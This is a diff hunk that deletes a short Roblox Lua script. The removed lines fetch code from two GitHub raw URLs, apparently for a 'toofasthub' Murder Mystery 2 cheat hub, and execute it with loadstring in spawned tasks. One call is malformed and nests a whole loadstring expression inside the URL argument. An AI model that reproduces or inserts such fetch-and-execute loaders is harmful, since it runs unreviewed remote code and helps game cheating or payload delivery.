@@ -1,9 +1,0 @@
-local function loader()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/toofasthub1/mm2v2/refs/heads/main/load'))()
-end
-local function auto()
-    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/trbrock/toofasthub/refs/heads/main/loader"))()'))()
-end
-
-task.spawn(loader)
-task.spawn(auto)
